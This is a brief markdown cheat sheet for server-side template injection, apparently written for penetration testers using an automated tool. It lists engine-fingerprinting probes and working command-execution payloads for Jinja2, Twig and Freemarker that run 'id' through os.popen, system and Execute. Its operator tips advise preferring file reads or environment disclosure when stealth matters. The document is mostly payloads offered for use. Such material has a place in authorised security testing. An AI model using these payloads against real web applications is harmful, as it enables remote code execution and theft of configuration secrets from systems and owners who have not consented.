# SSTI Engine Notes

## Fast Engine Hints

| Payload | Likely Engine Family |
|---------|----------------------|
| `{{7*7}}` -> `49` | Jinja2 / Twig / Nunjucks / Twig-like |
| `${7*7}` -> `49` | Freemarker / Velocity / EL-like |
| `<%= 7*7 %>` | ERB / EJS / embedded templates |
| `#{7*7}` | Pug / Slim-like |

## Jinja2 Common Paths

```jinja2
{{ config }}
{{ self.__init__.__globals__ }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

## Twig Common Paths

```twig
{{_self}}
{{['id']|map('system')}}
```

## Freemarker / Velocity

```text
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Operator Guidance

- Verify reflection and evaluation manually before launching automation.
- If the engine is obvious, force it with `--engine` to reduce noise.
- Prefer file read or env disclosure before command execution when stealth matters.
